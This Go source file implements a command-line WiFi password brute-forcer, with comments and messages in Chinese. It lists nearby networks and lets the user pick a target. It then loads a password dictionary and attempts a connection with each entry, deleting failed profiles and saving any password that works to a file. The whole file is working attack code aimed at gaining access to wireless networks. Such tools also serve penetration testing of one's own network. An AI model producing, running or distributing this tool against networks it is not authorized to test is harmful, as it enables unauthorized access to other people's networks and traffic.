package main

import (
	"bufio"
	"fmt"
	"github.com/projectdiscovery/goflags"
	"github.com/projectdiscovery/gologger"
	logutil "github.com/projectdiscovery/utils/log"
	"github.com/yearnming/wifi/pkg/config"
	"github.com/yearnming/wifi/pkg/setting"
	"github.com/yearnming/wifi/pkg/util"
	"github.com/yearnming/wifi/pkg/wifi"
	"os"
	"strings"
	"time"
)

func main() {
	// 测试提交
	//gologger.DefaultLogger.SetTimestamp(true, levels.LevelInfo)
	//gologger.DefaultLogger.SetTimestamp(true, levels.LevelError)
	var start = time.Now()
	Dict := ParseOptions()
	//filename := Dict.Dict

	// get wifi list
	networks, err := wifi.GetWIFINetworks()
	if err != nil {
		gologger.Info().Msgf("Get WIFI Networks: %s", err)
		return
	}

	// print wifi list
	gologger.Info().Msgf("WiFi 列表:")
	//fmt.Printf("%v", networks)
	for i, n := range networks {
		fmt.Printf("index: %d, 信号: %d, BSSID: %s, SSID: %s\n\n", i, n.Signal, n.BSSID, n.SSID)
	}

	// choose wifi
	gologger.Info().Msgf("选择 WiFi index: ")
	var selected int
	fmt.Scanln(&selected)
	if selected < 0 || selected >= len(networks) {
		gologger.Error().Msgf("选择无效")
		return
	}
	selection := networks[selected]
	gologger.Info().Msgf("你的选择: %v", selection.SSID)

	// create password producer
	//pwdChan := pwd.NewProducer(
	//	config.PwdMinLen,
	//	config.PwdMaxLen,
	//	config.PwdCharDict,
	//)

	//pwddict := []string{"66666666", "qpqp1010..", "12345678"}
	var couter int
	for _, asd := range Dict.WifiDict {
		var now = time.Now()
		couter++
		fmt.Println("-------------------------- 第", couter, "次尝试--------------------------")

		//log.Println("测试 password: ", asd)
		gologger.Info().Msgf("测试 password: %s", asd)
		wc := wifi.New(selection.SSID, asd)

		stat, err := wc.Connect()
		if err != nil {
			//log.Println("连接 WiFi 失败:", err)
			gologger.Error().Msgf("连接 WiFi 失败: %s", err)
			return
		}
		if stat == wifi.Connected {
			//log.Println("连接 WiFi 成功:", selection.SSID, asd)
			gologger.Info().TimeStamp().Msgf("成功连接 WiFi (%s) : 密码(%s)", selection.SSID, asd)
			err = util.WriteToFile(setting.SuccessPwdSavePath, fmt.Sprintf("WiFi: %s, password: %s\n", wc.Ssid, asd))
			if err != nil {
				gologger.Error().Msgf("将密码写入文件 ERR: %s ", err)
				//log.Println("将密码写入文件 ERR: ", err)
			}
			return
		}
		//log.Println("连接 WiFi 失败")
		gologger.Error().TimeStamp().Msgf("连接 WiFi 失败")
		err = wc.DeleteProfile()
		if err != nil {
			gologger.Error().Msgf("删除配置文件失败: %s", err)
			//log.Println("删除配置文件失败:", err)
			return
		}
		//log.Println("删除配置文件成功")
		gologger.Info().Msgf("删除配置文件成功")
		gologger.Info().Msgf("总计时间: %s, 当前花费时间: %s",
			time.Since(start).Truncate(time.Second).String(),
			time.Since(now).Truncate(time.Second).String(),
		)
	}
}

type Options struct {
	Dict     string   // Dict wifi密码字典文件
	WifiDict []string // Dict wifi密码字典文件
}

func ParseOptions() *Options {
	logutil.DisableDefaultLogger()

	options := &Options{}

	var err error
	flagSet := goflags.NewFlagSet()
	flagSet.SetDescription(`wifi 自动尝试密码`)

	flagSet.CreateGroup("input", "Input",
		flagSet.StringVarP(&options.Dict, "dict", "l", "", "wifi密码字典"),
	)
	flagSet.SetCustomHelpText("使用示例:\ngo run main.go -l common.txt")

	if err := flagSet.Parse(); err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}

	err = options.validateOptions()
	if err != nil {
		gologger.Fatal().Msgf("程序退出: %s\n", err)
	}
	return options
}

// validateOptions 验证传递的配置选项
func (options *Options) validateOptions() error {
	if options.Dict == "" {
		options.WifiDict = options.LoadWifiDict(config.Dictfile)
		gologger.Info().Msgf("使用默认字典")

		//return errors.New("没有提供参数")
	} else {
		// 使用 Stat 函数检查文件
		if _, err := os.Stat(options.Dict); err == nil {
			gologger.Info().Msgf("文件存在: %s\n", options.Dict)
		} else if os.IsNotExist(err) {
			gologger.Error().Msgf("WiFi密码字典不存在: %s\n", options.Dict)
			return err
		} else {
			gologger.Error().Msgf("检查文件时发生错误: %s\n", err)
			return err
		}
		//filename := "common.txt"
		// 打开文件
		file, err := os.Open(options.Dict)
		if err != nil {
			panic(err)
		}
		defer file.Close()

		// 创建一个扫描器来读取文件
		scanner := bufio.NewScanner(file)

		// 读取所有行到一个切片中
		//var lines []string
		for scanner.Scan() {
			options.WifiDict = append(options.WifiDict, scanner.Text())
		}

		// 检查读取过程中是否有错误发生
		if err := scanner.Err(); err != nil {
			panic(err)
		}

	}
	return nil
}

// LoadWebfingerprint 加载内置WiFi密码字典
func (options *Options) LoadWifiDict(path string) []string {
	//data := []byte(path)
	//= path
	//gologger.Info().Msgf("字典：%v", path)
	Dict := strings.Split(path, "\r\n")
	//gologger.Info().Msgf("字典字数：%v", len(Dict))
	return Dict
}
